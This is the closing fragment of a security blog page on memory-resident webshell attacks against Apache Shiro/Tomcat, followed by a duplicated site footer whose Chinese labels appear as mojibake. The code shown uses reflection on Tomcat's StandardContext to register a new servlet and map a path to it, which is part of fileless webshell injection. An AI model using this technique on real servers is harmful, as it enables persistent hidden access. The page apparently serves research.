    <span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">containerClass</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"org.apache.catalina.Container"</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="n">standardContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getClassLoader</span><span class="o">());</span>
    <span class="nc">Object</span> <span class="n">oldWrapper</span> <span class="o">=</span> <span class="n">invoke</span><span class="o">(</span><span class="n">standardContext</span><span class="o">,</span> <span class="s">"findChild"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">[]</span> <span class="o">{</span> <span class="n">wrapperName</span> <span class="o">});</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">oldWrapper</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
      <span class="n">standardContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"removeChild"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Class</span><span class="o">[]</span> <span class="o">{</span> <span class="n">containerClass</span> <span class="o">});</span> 
    <span class="n">standardContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"addChild"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Class</span><span class="o">[]</span> <span class="o">{</span> <span class="n">containerClass</span> <span class="o">}).</span><span class="na">invoke</span><span class="o">(</span><span class="n">standardContext</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">[]</span> <span class="o">{</span> <span class="n">newWrapper</span> <span class="o">});</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">method</span> <span class="o">=</span> <span class="n">standardContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"addServletMappingDecoded"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Class</span><span class="o">[]</span> <span class="o">{</span> <span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">String</span><span class="o">.</span><span class="na">class</span> <span class="o">});</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">var9</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">method</span> <span class="o">=</span> <span class="n">standardContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"addServletMapping"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Class</span><span class="o">[]</span> <span class="o">{</span> <span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">String</span><span class="o">.</span><span class="na">class</span> <span class="o">});</span>
    <span class="o">}</span> 
    <span class="n">method</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">standardContext</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">[]</span> <span class="o">{</span> <span class="k">this</span><span class="o">.</span><span class="na">path</span><span class="o">,</span> <span class="n">wrapperName</span> <span class="o">});</span>
    <span class="n">init</span><span class="o">((</span><span class="nc">ServletConfig</span><span class="o">)</span><span class="n">getFieldValue</span><span class="o">(</span><span class="n">newWrapper</span><span class="o">,</span> <span class="s">"facade"</span><span class="o">));</span>
  <span class="o">}</span>
</code></pre></div></div>


				</div>
				<div class="spacing"></div>
	            <div>
	<div class="hline"></div>
	<h3><em>#</em> ç”³æ˜</h3>
	<div class="spacing"></div>
	<h4><em>By: Bin4xin.</em></h4>
	<h4>è½¬è½½è¯·ç”³æ˜æœ¬æ–‡é“¾æ¥ï¼š<a href="/help/Research-on-Webshell-Attack-of-Shiro-Framework-Based-on-Memory/" target="_blank"><code-index-css>ã€Š<em>Research On Webshell Attack Of Shiro Framework Based On Memory</em>ã€‹</code-index-css></a></h4>

	<h3><em># Any Questions</em></h3>
	<div class="spacing"></div>
	<h4> >_ å¯¹æœ¬æ–‡è¿›è¡Œæé—®ï¼š<a href="https://github.com/Bin4xin/bin4xin.github.io/issues/new?permalink=https://github.com/Bin4xin/bin4xin.github.io/blob/1b4fffa6232dc6ffa2cece8be0d6c39e0c5f9cfe/help/Research-on-Webshell-Attack-of-Shiro-Framework-Based-on-Memory/index.html%23L84" target="_blank"> <em><li class="fa fa-github"></li> Reference in new issue.</em></a></h4>

	<h4> >_ å¯¹æœ¬æ–‡è¿›è¡Œç•™è¨€ï¼š<a href="https://github.com/Bin4xin/bin4xin.github.io/issues/new?permalink=https://about.sentrylab.cn/help/Research-on-Webshell-Attack-of-Shiro-Framework-Based-on-Memory/" target="_blank"> <em><li class="fa fa-github"></li> Leave a Comment.</em></a></h4>
</div>
			</div><!-- help content -->
	  </div>
	</div><!--/container -->
</div><!--/mirrors -->
	


<div id="footerwrap" class="tuna-foot-1">
<div class="container">
    <div class="row">
            <div class="col-sm-4">
                <div class="col-sm-6">
                  <p class="thuhidden"><strong>å…¥é—¨</strong></p>
                  <p class="thuhidden"><a href="https://github.com/tuna/mirror-web" target="blank"><em>Jekyll</em>æºç </a></p>
                  <p class="thuhidden"><a href="https://www.sentrylab.cn/blog/2019/jekyll/in/linux/" target="blank">åšå®¢æ­å»ºæ•™ç¨‹</a></p>
                  <p class="thuhidden"><a href="https://about.sentrylab.cn/news/sentry-lab-markdown-usage/" target="blank">ä¸ªæ€§åŒ–è¯­æ³•æ‰¹æ³¨</a></p>
                  <p class="thuhidden"><a href="https://www.sentrylab.cn/blog/2019/nginx/with/jekyll-site/" target="blank">å…¬ç½‘éƒ¨ç½²</a></p>
                  </div>

                  <div class="col-sm-6">
                  <p class="thuhidden"><strong>ç¤¾åŒº</strong></p>
                  <p class="thuhidden"><a href="/blog" target="blank">åšå®¢</a></p>
                  <p class="thuhidden"><a href="https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV" target="blank"><em>Collection of verified vulnerabilities</em></a></p>
                  <p class="thuhidden"><a href="https://github.com/Bin4xin/bigger-than-bigger" target="blank"><em>Bigger than Bigger</em></a></p>
                  <p class="thuhidden"><a href="https://github.com/Bin4xin/B4xinSynchronize" target="blank"><em>B4xinSynchronize</em></a></p>
                  </div>
            </div>

            <div class="col-sm-4">
                  <div class="col-sm-6">
                    <p class="thuhidden"><strong>å¼€å‘</strong></p>
                    <p class="thuhidden"><a href="https://github.com/Bin4xin/Bin4xin" target="blank"><em>Bin4xin</em></a></p>
                    <p class="thuhidden"><a href="https://www.cloudflare.com/waf/" target="blank"><em>CloudFlare WAF</em></a></p>
                    <p class="thuhidden"><a href="https://jekyllrb.com/docs/" target="blank"><em>Jekyll</em></a></p>
                    <p class="thuhidden"><a href="https://www.markdownguide.org/" target="blank"><em>MarkDown</em></a></p>
                    <p class="share">
                    <a href="https://github.com/Bin4xin/" target="blank"><i class="fa fa-github"></i></a>
                    <a href="https://twitter.com/Bin4xin/"><i class="fa fa-twitter" target="blank"></i></a>
                    <a href="#"><i class="fa fa-facebook" target="blank"></i></a>
                    </p>
                  </div>

                  <div class="col-sm-6">
                    <p class="thuhidden"><strong>å…³äº</strong></p>
                    <p class="thuhidden"><a href="https://about.sentrylab.cn/" target="blank">è¿‘æœŸç ”ç©¶</a></p>
                    <p class="thuhidden">âˆ‘ <csmall>(Visitors/times)</csmall></em></p>
                    <img src="https://profile-counter.glitch.me/bin4xin.github.io/count.svg" style="max-width:100%;">
                  </div>
            </div>

        <div class="col-sm-4">
          
          <img src="/static/img/logo-small@3x.png" />

        </div>
    </div><!--/row -->
    
    <p class="thuhidden">Â© 2019-2021 SentrySec, Lab. Build by Jekyll under the terms of the MIT License.</p>

  </div>
</div>




<div id="footerwrap" class="tuna-foot-2">
<div class="container">
    <div class="row">
            <div class="col-sm-4">
                <div class="col-sm-6">
                  <p class="thuhidden"><strong>å…¥é—¨</strong></p>
                  <p class="thuhidden"><a href="https://github.com/tuna/mirror-web" target="blank"><em>Jekyll</em>æºç </a></p>
                  <p class="thuhidden"><a href="https://www.sentrylab.cn/blog/2019/jekyll/in/linux/" target="blank">åšå®¢æ­å»ºæ•™ç¨‹</a></p>
                  <p class="thuhidden"><a href="https://about.sentrylab.cn/news/sentry-lab-markdown-usage/" target="blank">ä¸ªæ€§åŒ–è¯­æ³•æ‰¹æ³¨</a></p>
                  <p class="thuhidden"><a href="https://www.sentrylab.cn/blog/2019/nginx/with/jekyll-site/" target="blank">å…¬ç½‘éƒ¨ç½²</a></p>
                  </div>

                  <div class="col-sm-6">
                  <p class="thuhidden"><strong>ç¤¾åŒº</strong></p>
                  <p class="thuhidden"><a href="/blog" target="blank">åšå®¢</a></p>
                  <p class="thuhidden"><a href="https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV" target="blank"><em>Collection of verified vulnerabilities</em></a></p>
                  <p class="thuhidden"><a href="https://github.com/Bin4xin/bigger-than-bigger" target="blank"><em>Bigger than Bigger</em></a></p>
                  <p class="thuhidden"><a href="https://github.com/Bin4xin/B4xinSynchronize" target="blank"><em>B4xinSynchronize</em></a></p>
                  </div>
            </div>

            <div class="col-sm-4">
                  <div class="col-sm-6">
                    <p class="thuhidden"><strong>å¼€å‘</strong></p>
                    <p class="thuhidden"><a href="https://github.com/Bin4xin/Bin4xin" target="blank"><em>Bin4xin</em></a></p>
                    <p class="thuhidden"><a href="https://www.cloudflare.com/waf/" target="blank"><em>CloudFlare WAF</em></a></p>
                    <p class="thuhidden"><a href="https://jekyllrb.com/docs/" target="blank"><em>Jekyll</em></a></p>
                    <p class="thuhidden"><a href="https://www.markdownguide.org/" target="blank"><em>MarkDown</em></a></p>
                    <p class="share">
                    <a href="https://github.com/Bin4xin/" target="blank"><i class="fa fa-github"></i></a>
                    <a href="https://twitter.com/Bin4xin/"><i class="fa fa-twitter" target="blank"></i></a>
                    <a href="#"><i class="fa fa-facebook" target="blank"></i></a>
                    </p>
                  </div>

                  <div class="col-sm-6">
                    <p class="thuhidden"><strong>å…³äº</strong></p>
                    <p class="thuhidden"><a href="https://about.sentrylab.cn/" target="blank">è¿‘æœŸç ”ç©¶</a></p>
                    <p class="thuhidden">âˆ‘ <csmall>(Visitors/times)</csmall></em></p>
                    <img src="https://profile-counter.glitch.me/bin4xin.github.io/count.svg" style="max-width:100%;">
                  </div>
            </div>

        <div class="col-sm-4">
          
          <img src="/static/img/logo-small@3x.png" />

        </div>
    </div><!--/row -->
    
    <p class="thuhidden">Â© 2019-2021 SentrySec, Lab. Build by Jekyll under the terms of the MIT License.</p>

  </div>
</div>


</body>

<script src="/static/js/help.js"></script>
</html>
<!--
vim: ts=2 sts=2 sw=2 noexpandtab
-->
